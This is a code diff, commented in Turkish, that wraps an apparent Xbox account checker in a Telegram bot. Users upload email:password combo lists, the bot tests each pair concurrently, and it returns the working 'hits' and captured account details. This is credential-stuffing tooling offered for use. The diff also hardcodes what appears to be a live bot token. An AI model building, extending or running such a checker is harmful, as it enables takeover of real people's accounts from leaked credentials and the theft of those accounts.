@@ -18,7 +18,7 @@ urllib3.disable_warnings()
 warnings.filterwarnings("ignore")
 
 # -------------------- BOT TOKEN --------------------
-TOKEN = "8586488864:AAETJFeQOk_igst2YE1OWq9QvpM25jTDEq4"
+TOKEN = "8586488864:AAETJFeQOk_igst2YE1OWq9QvpM25jTDEq4"  # İstersen environment variable'dan al
 
 # -------------------- ORİJİNAL FONKSİYONLAR (Aynen) --------------------
 def get_banner():
@@ -338,7 +338,7 @@ def check_account(combo):
         stats.errors += 1
         stats.checked += 1
 
-# -------------------- BOT İÇİN YARDIMCI FONKSİYON --------------------
+# -------------------- BOT İÇİN YARDIMCI FONKSİYON (DÜZELTİLDİ) --------------------
 def get_stats_panel():
     return (
         "📊 Istatistikler\n"
@@ -355,3 +355,136 @@ def get_stats_panel():
         f"⚡ CPM: {stats.get_cpm()}\n"
         "─────────────────"
     )
+
+# -------------------- TELEGRAM BOT KOMUTLARI --------------------
+WAITING_INPUT = 0
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "🤖 **Xbox Hesap Kontrol Botu**\n\n"
+        "Kontrol başlatmak için `/check` komutunu kullanın.\n"
+        "Combo listesini `.txt` dosyası olarak gönderebilir veya doğrudan metin olarak yapıştırabilirsiniz.\n"
+        "İptal etmek için `/cancel` yazın."
+    )
+
+async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "📁 Lütfen comboları içeren bir **.txt dosyası** gönderin veya **email:password** formatında satır satır metin yazın.\n"
+        "İptal etmek için `/cancel` yazın."
+    )
+    return WAITING_INPUT
+
+async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_input = update.message
+
+    if user_input.document:
+        if user_input.document.mime_type == "text/plain" or user_input.document.file_name.endswith('.txt'):
+            file = await user_input.document.get_file()
+            file_path = f"temp_{datetime.now().strftime('%Y%m%d%H%M%S')}.txt"
+            await file.download_to_drive(file_path)
+
+            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                combos = [line.strip() for line in f if line.strip() and ':' in line]
+            os.remove(file_path)
+        else:
+            await update.message.reply_text("❌ Lütfen sadece **.txt** dosyası gönderin.")
+            return WAITING_INPUT
+
+    elif user_input.text:
+        lines = user_input.text.split('\n')
+        combos = [line.strip() for line in lines if line.strip() and ':' in line]
+
+    else:
+        await update.message.reply_text("❌ Geçersiz girdi. Dosya veya metin gönderin.")
+        return WAITING_INPUT
+
+    if not combos:
+        await update.message.reply_text("❌ Hiç geçerli combo bulunamadı (email:password formatında olmalı).")
+        return WAITING_INPUT
+
+    await update.message.reply_text(f"✅ {len(combos)} adet combo alındı. Kontrol başlatılıyor...")
+
+    progress_msg = await update.message.reply_text("⏳ Kontrol ediliyor...")
+    context.user_data['combos'] = combos
+    context.user_data['progress_msg_id'] = progress_msg.message_id
+    context.user_data['chat_id'] = update.effective_chat.id
+
+    # Asenkron arka plan işlemini başlat
+    asyncio.create_task(process_combos(context))
+    return ConversationHandler.END
+
+async def process_combos(context: ContextTypes.DEFAULT_TYPE):
+    combos = context.user_data['combos']
+    chat_id = context.user_data['chat_id']
+    msg_id = context.user_data['progress_msg_id']
+
+    # Yeni oturum için global değişkenleri sıfırla
+    global stats, results_folder, session_name
+    stats = Stats()
+    results_folder, session_name = create_results_folder()
+
+    total = len(combos)
+
+    # Thread havuzu ile kontrol işlemini asenkron yürüt
+    loop = asyncio.get_event_loop()
+    with concurrent.futures.ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
+        futures = [loop.run_in_executor(executor, check_account, combo) for combo in combos]
+        # Her bir future tamamlandığında ilerlemeyi güncelle
+        for f in asyncio.as_completed(futures):
+            await f  # tamamlanmasını bekle, hata olsa bile geç
+            panel_text = get_stats_panel()
+            try:
+                await context.bot.edit_message_text(
+                    chat_id=chat_id,
+                    message_id=msg_id,
+                    text=f"⏳ **Kontrol devam ediyor...**\n\n{panel_text}"
+                )
+            except Exception:
+                pass
+
+    # Bitti mesajı
+    final_text = f"✅ **Kontrol tamamlandı!**\n\n{get_stats_panel()}"
+    await context.bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=final_text)
+
+    # Sonuç dosyalarını gönder
+    hits_path = f"{results_folder}/Hits.txt"
+    if os.path.exists(hits_path):
+        with open(hits_path, 'r', encoding='utf-8') as f:
+            hits_content = f.read()
+        if len(hits_content) > 4000:
+            hits_content = hits_content[:4000] + "\n... (kesildi)"
+        await context.bot.send_message(chat_id=chat_id, text=f"🎯 **Hit Listesi:**\n```\n{hits_content}\n```", parse_mode="MarkdownV2")
+
+    capture_path = f"{results_folder}/Capture.txt"
+    if os.path.exists(capture_path):
+        with open(capture_path, 'r', encoding='utf-8') as f:
+            capture_content = f.read()
+        if len(capture_content) > 4000:
+            capture_content = capture_content[:4000] + "\n... (kesildi)"
+        await context.bot.send_message(chat_id=chat_id, text=f"📄 **Detaylı Capture:**\n```\n{capture_content}\n```", parse_mode="MarkdownV2")
+
+async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("❌ İşlem iptal edildi.")
+    return ConversationHandler.END
+
+def main():
+    app = Application.builder().token(TOKEN).build()
+
+    conv_handler = ConversationHandler(
+        entry_points=[CommandHandler('check', check_command)],
+        states={
+            WAITING_INPUT: [
+                MessageHandler(filters.TEXT | filters.Document.ALL, handle_input)
+            ],
+        },
+        fallbacks=[CommandHandler('cancel', cancel)]
+    )
+
+    app.add_handler(CommandHandler('start', start))
+    app.add_handler(conv_handler)
+
+    print("🤖 Bot çalışıyor...")
+    app.run_polling()
+
+if __name__ == "__main__":
+    main()
